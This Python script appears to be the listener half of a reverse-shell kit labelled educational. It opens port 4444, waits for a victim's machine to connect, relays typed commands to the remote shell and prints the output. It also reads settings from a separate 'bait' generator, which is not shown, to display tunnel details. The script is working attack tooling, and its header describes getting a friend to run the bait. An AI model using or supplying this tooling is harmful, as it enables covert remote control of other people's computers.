# ============================================================
#  LISTENER (your machine) — Educational Reverse Shell Demo
#  Run this FIRST on YOUR computer before your
#  friend runs the bait.
#
#  Usage: python rs_listener.py
#  To close: Ctrl+C in this terminal
# ============================================================

import socket
import sys
import threading

sys.stdout.reconfigure(encoding='utf-8')
import codecs
import os

PORT = 4444
_closing = threading.Event()


def get_local_ip():
    """Returns the primary local IP using the UDP trick."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(('8.8.8.8', 80))
            return s.getsockname()[0]
    except OSError:
        return None


def get_payload_target():
    """Reads the IP and PORT from the last generated bait (.last_target)."""
    try:
        target = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.last_target')
        with open(target, 'r') as f:
            lines = f.read().strip().splitlines()
        if len(lines) >= 2:
            return lines[0], int(lines[1])
    except Exception:
        pass
    return None, None


def cleanup(conn, server, reason=''):
    """Clean shutdown: shows messages and terminates the process."""
    if _closing.is_set():
        return
    _closing.set()
    if reason:
        print(f'\n\033[31m{reason}\033[0m')
        print('\033[31m[-] Closing connection.\033[0m')
    else:
        print('\n\033[31m[-] Closing connection.\033[0m')
    try:
        conn.close()
    except Exception:
        pass
    try:
        server.close()
    except Exception:
        pass
    print('\033[31m[*] Listener closed.\033[0m')
    sys.stdout.flush()
    os._exit(0)


def receive_output(conn, decoder, server):
    """Thread: displays on screen what arrives from the remote shell."""
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                cleanup(conn, server, '[-] Connection closed by the client.')
                return
            sys.stdout.write(decoder.decode(data))
            sys.stdout.flush()
        except ConnectionResetError:
            cleanup(conn, server, '[-] Connection closed by the client.')
            return
        except OSError:
            return


def handle_connection(conn, addr, server):
    print(f'\033[32m[+] Connection received from: {addr[0]}\033[0m')
    print('\033[33m[!] You can now type commands. Type exit to close.\033[0m')
    print('─' * 50)

    decoder = codecs.getincrementaldecoder('utf-8')('replace')

    t = threading.Thread(target=receive_output, args=(conn, decoder, server), daemon=True)
    t.start()

    try:
        while True:
            cmd = input()
            conn.sendall((cmd + '\n').encode('utf-8'))
            if cmd.strip().lower() == 'exit':
                t.join(timeout=2)
                cleanup(conn, server)
                return
    except (KeyboardInterrupt, EOFError):
        cleanup(conn, server)
    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError):
        cleanup(conn, server, '[-] Connection closed by the client.')


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    server.bind(('0.0.0.0', PORT))
except OSError:
    print(f'\033[31m[!] Port {PORT} is already in use. Close the process that is using it.\033[0m')
    sys.exit(1)

server.listen(1)
server.settimeout(1.0)

print('\033[36m╔' + '═' * 40 + '╗')
print('║  REVERSE SHELL LISTENER — Demo         ║')
print('╚' + '═' * 40 + '╝\033[0m')
print(f'\033[33m[*] Listening on port {PORT}...')
print('[*] Waiting for client to connect...\033[0m')
print()
ip_local = get_local_ip()
target_ip, target_port = get_payload_target()
print('Connection:')
if ip_local:
    print(f'  \033[32mLocal IP : {ip_local}\033[0m')
    if target_ip and target_ip not in (ip_local, '127.0.0.1', 'localhost'):
        port_str = f':{target_port}' if target_port else ''
        print(f'  \033[32mTunnel   : {target_ip}{port_str} → {ip_local}:{PORT}\033[0m')
    else:
        print(f'  \033[32mListener : {ip_local}:{PORT}\033[0m')
else:
    print(f'  \033[31mNo network connection\033[0m')
print()

try:
    conn = None
    while conn is None:
        try:
            conn, addr = server.accept()
        except socket.timeout:
            continue
    handle_connection(conn, addr, server)
except KeyboardInterrupt:
    print('\n\033[31m[-] Closing connection.\033[0m')
    server.close()
    print('\033[31m[*] Listener closed.\033[0m')
    sys.stdout.flush()
    sys.exit(0)
